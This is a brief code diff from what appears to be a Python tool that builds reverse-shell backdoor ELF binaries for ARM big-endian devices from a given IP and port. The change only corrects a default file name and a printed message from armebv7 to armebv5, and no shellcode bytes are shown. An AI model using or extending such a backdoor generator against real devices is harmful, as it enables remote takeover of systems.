@@ -503,12 +503,12 @@ def generate_armebv5_backdoor(reverse_ip,reverse_port,filename):
 	all_reverseshell=basic_shellcode+shellcode2+shellcode3
 	data=make_elf(all_reverseshell)
 	if filename==None:
-		filename="backdoor_armebv7"
+		filename="backdoor_armebv5"
 		f=open(filename,"wb")
 		f.write(data)
 		f.close()
 		#print disasm(all_reverseshell)
-		print "backdoor_armebv7 is ok in ./"
+		print "backdoor_armebv5 is ok in ./"
 	else:
 		f=open(filename,"wb")
 		f.write(data)
